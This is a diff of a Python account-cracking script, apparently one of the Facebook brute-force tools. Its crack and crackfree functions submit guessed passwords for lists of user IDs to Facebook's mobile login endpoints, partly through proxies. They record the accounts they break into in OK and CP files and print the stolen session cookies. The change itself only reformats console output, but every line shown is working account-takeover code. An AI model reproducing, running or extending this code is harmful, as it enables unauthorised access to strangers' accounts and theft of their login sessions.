@@ -367,7 +367,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x} [{K}>{N}] ID   : {K}{idf}')
-				print(f'\r{x} [{K}>{N}] PW : {K}{pw}\n')
+				print(f'\r{x} [{K}>{N}] PW   : {K}{pw}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw)
 				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
@@ -378,9 +378,9 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				
-				print(f'\r{x} [{H}>{N}] ID           :{H}{idf}')
-				print(f'\r{x} [{K}>{N}] PW         : {K}{pw}')
-				print(f'\r{x} [{H}>{N}] COOKIE : {m}{kuki}{x}\n')
+				print(f'\r{x} [{H}>{N}] ID         :{H}{idf}')
+				print(f'\r{x} [{H}>{N}] PW         : {H}{pw}')
+				print(f'\r{x} [{H}>{N}] COOKIE     : {m}{kuki}{x}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw)
 				#os.popen('play-audio data/ok.mp3')
 				cek_apk(session,coki)
@@ -413,7 +413,7 @@ def crackfree(idf,pwv):
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x} [{K}>{N}] ID   : {K}{idf}')
-				print(f'\r{x} [{K}>{N}] PW : {K}{pw}\n')
+				print(f'\r{x} [{K}>{N}] PW   : {K}{pw}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw)
 				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
@@ -424,8 +424,8 @@ def crackfree(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{x} [{H}>{N}] ID           :{H}{idf}')
-				print(f'\r{x} [{K}>{N}] PW         : {K}{pw}')
-				print(f'\r{x} [{H}>{N}] COOKIE : {m}{kuki}{x}\n')
+				print(f'\r{x} [{H}>{N}] PW           : {K}{pw}')
+				print(f'\r{x} [{H}>{N}] COOKIE       : {m}{kuki}{x}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw)
 				cek_apk(session,coki)
 				break
